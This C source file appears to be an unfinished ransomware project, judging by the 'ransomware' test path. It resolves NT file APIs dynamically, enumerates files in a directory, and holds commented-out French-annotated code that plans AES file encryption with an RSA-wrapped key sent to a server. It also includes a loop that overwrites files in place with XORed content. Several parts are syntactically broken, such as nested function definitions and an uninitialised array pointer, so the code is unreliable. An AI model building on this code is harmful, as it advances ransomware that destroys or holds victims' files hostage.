#include <windows.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <winternl.h>
#include ".\core\list_files\list_files.h"

#pragma comment(lib, "ntdll.lib")

#define CHUNK_SIZE 4096

typedef NTSTATUS (NTAPI *NtOpenFile_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
    PIO_STATUS_BLOCK, ULONG, ULONG
);
typedef NTSTATUS (NTAPI *NtReadFile_t)(
    HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK,
    PVOID, ULONG, PLARGE_INTEGER, PULONG
);
typedef NTSTATUS (NTAPI *NtWriteFile_t)(
    HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK,
    PVOID, ULONG, PLARGE_INTEGER, PULONG
);
/* 
void load_file(unsigned char* file_buffer, long file_size, char *file_path)
{
    FILE *file;
    size_t result;
    
    // Ouvrir le fichier en mode binaire (lecture)
    file = fopen("exemple.pdf", "rb");
    if (file == NULL) {
        printf("Impossible d'ouvrir le fichier\n");
        return 1;
    }
    
    // Obtenir la taille du fichier
    fseek(file, 0, SEEK_END);
    file_size = ftell(file);
    rewind(file);
    
    // Allouer de la mémoire pour stocker le contenu du fichier
    buffer = (unsigned char*) malloc(file_size);
    if (buffer == NULL) {
        printf("Erreur d'allocation mémoire\n");
        fclose(file);
        return 2;
    }
    
    // Copier le fichier dans le buffer
    result = fread(buffer, 1, file_size, file);
    if (result != file_size) {
        printf("Erreur de lecture\n");
        fclose(file);
        free(buffer);
        return 3;
    }
    
    // À ce stade, buffer contient tous les bytes du fichier
    // Par exemple, afficher les 16 premiers bytes en hexadécimal
    printf("Premiers bytes du fichier:\n");
    for (int i = 0; i < (file_size < 16 ? file_size : 16); i++) {
        printf("%02X ", buffer[i]);
    }
    printf("\n");
    
    // Fermer le fichier et libérer la mémoire
    fclose(file);
} */
/* 
void encrypt_file(char *file_path)
{
    printf("Encrypting file: %s\n", file_path);
    // On va créer une clé de 128 bits de manière aléatoire
    // On va l'utiliser pour chiffrer le fichier
    // On va utiliser l'algorithme AES
    // On va chiffrer la clé avec une clé publique RSA dont on a la clé privée
    // On va envoyer la clé privé au serveur
   
    
    void XorBuffer(BYTE* buffer, DWORD size, BYTE key) {
        for (DWORD i = 0; i < size; i++) {
            buffer[i] ^= key;
        }
    }
    
    int main() {
        // Charger dynamiquement les fonctions NT
        HMODULE ntdll = LoadLibraryA("ntdll.dll");
        NtOpenFile_t NtOpenFile = (NtOpenFile_t)GetProcAddress(ntdll, "NtOpenFile");
        NtReadFile_t NtReadFile = (NtReadFile_t)GetProcAddress(ntdll, "NtReadFile");
        NtWriteFile_t NtWriteFile = (NtWriteFile_t)GetProcAddress(ntdll, "NtWriteFile");
    
        UNICODE_STRING fileName;
        RtlInitUnicodeString(&fileName, L"\\??\\C:\\test\\monfichier.txt");
    
        OBJECT_ATTRIBUTES objAttr;
        InitializeObjectAttributes(&objAttr, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    
        IO_STATUS_BLOCK ioStatus;
        HANDLE hFile;
    
        NTSTATUS status = NtOpenFile(&hFile,
            FILE_GENERIC_READ | FILE_GENERIC_WRITE,
            &objAttr, &ioStatus,
            FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT
        );
    
        if (status != 0) {
            printf("Erreur ouverture : 0x%X\n", status);
            return 1;
        }
    
        BYTE buffer[CHUNK_SIZE];
        LARGE_INTEGER offset = { 0 };
    
        while (TRUE) {
            status = NtReadFile(hFile, NULL, NULL, NULL, &ioStatus, buffer, CHUNK_SIZE, &offset, NULL);
            if (status != 0 || ioStatus.Information == 0)
                break;
    
            XorBuffer(buffer, (DWORD)ioStatus.Information, 0xAA); // Simule un chiffrement
    
            // Réécriture à la même position
            NtWriteFile(hFile, NULL, NULL, NULL, &ioStatus, buffer, (DWORD)ioStatus.Information, &offset, NULL);
    
            offset.QuadPart += ioStatus.Information;
        }
    
        CloseHandle(hFile);
        printf("Fichier modifié in-place.\n");
        return 0;
    }
    
} */

int main()
{
    // Get the current directory    
    /* char current_dir[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, current_dir) == 0)
    {
        printf("Error getting current directory\n");
        return 1;
    }
    snprintf(current_dir, sizeof(current_dir), "%s\\*.*", current_dir); 
    list_files(current_dir);*/
    char dir[MAX_PATH];
    FileDataArray* arr;
    initHandleArray(arr);
    snprintf(dir, sizeof(dir), "%s", "C:\\Users\\l3gro\\Documents\\code\\C\\ransomware\\test");
    list_files(dir, arr);
    
    

    // Free the allocated memory for file names
    freeHandleArray(arr);
    
    return 0;
}